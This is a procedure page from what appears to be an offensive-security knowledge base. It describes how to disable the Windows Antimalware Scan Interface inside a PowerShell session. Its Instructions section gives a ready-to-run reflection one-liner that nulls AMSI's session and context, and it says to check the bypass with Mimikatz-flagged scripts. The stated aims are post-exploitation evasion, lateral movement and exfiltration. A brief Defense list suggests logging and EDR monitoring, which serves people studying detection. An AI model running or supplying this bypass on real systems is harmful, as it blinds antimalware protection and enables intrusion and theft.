---
type: procedure
description: >-
  Disables the Antimalware Scan Interface (AMSI) session and context in
  PowerShell to evade antimalware detection.
verified: true
submitted: false
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[Disable or Modify Tools]]'
sub_techniques: []
tags:
  - amsi-bypass
  - defense-evasion
  - powershell
commands:
  - '[[commands/disable-amsi-session-context]]'
platforms:
  - Windows
tools: []
validated: true
---

# Disable-AMSI-Session-and-Context

## Summary

This procedure disables the AMSI session and context within a PowerShell process, preventing antimalware products from scanning scripts and content for malicious patterns. It uses .NET reflection to nullify internal AMSI state, allowing attackers to execute obfuscated or flagged code without detection in the current session.

## Description

AMSI is a Windows interface that enables applications like PowerShell to integrate with antimalware providers (e.g., Windows Defender) for real-time scanning of scripts, files, and memory content. By default, PowerShell invokes AMSI before executing code, blocking known malicious patterns. This procedure targets the static fields `amsiSession` and `amsiContext` in the `AmsiUtils` class using reflection to allocate dummy memory and set these pointers to null, effectively impairing AMSI functionality for the duration of the PowerShell process. This technique is particularly useful in post-exploitation scenarios where initial access has been gained via phishing or other vectors, enabling further payload execution without alerting endpoint protection. It requires no administrative privileges and works on Windows 10 and later with PowerShell 5+. The business impact includes successful evasion of behavioral detection, facilitating lateral movement, persistence, or data exfiltration.

## Requirements

1. Access to a PowerShell console or script execution context on the target Windows system.
2. PowerShell version 5.0 or higher (default on modern Windows).
3. No elevated privileges required, but the process must allow .NET reflection (standard in interactive sessions).
4. Target environment: Windows 10/11 or Server 2016+ with AMSI-enabled antimalware.

## Defense

- Enable comprehensive PowerShell logging (Module, Script Block, and Transcription logging) to capture reflection-based modifications.
- Monitor for anomalous .NET method invocations involving `AmsiUtils` or memory allocation patterns via EDR tools.
- Implement application whitelisting (e.g., AppLocker) to restrict unsigned PowerShell execution.
- Regularly update antimalware signatures and enable AMSI hardening features in PowerShell.
- Use behavioral analytics to detect post-bypass execution of known malicious scripts.

## Objectives

1. Impair AMSI scanning to allow execution of malicious PowerShell code without detection.
2. Maintain operational security in the current session for subsequent attack steps.
3. Verify bypass success by testing with flagged content.

## Instructions

### Step 1: Execute AMSI Disablement in PowerShell Session

**Context**: This step uses reflection to nullify AMSI's internal state, disabling scanning for the current PowerShell process. Run it early in an interactive session before executing any suspicious code.

**Command** ([[commands/disable-amsi-session-context]]):
```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

> This command allocates a 9076-byte memory block via Marshal and sets the `amsiSession` to null while pointing `amsiContext` to the allocated memory, tricking AMSI into failing initialization. It produces no console output on success. To verify, execute a test script known to trigger AMSI (e.g., one containing obfuscated Invoke-Mimikatz patterns); if it runs without blocking, the bypass succeeded. Note: This affects only the current PowerShell instance—spawned child processes may require re-execution.
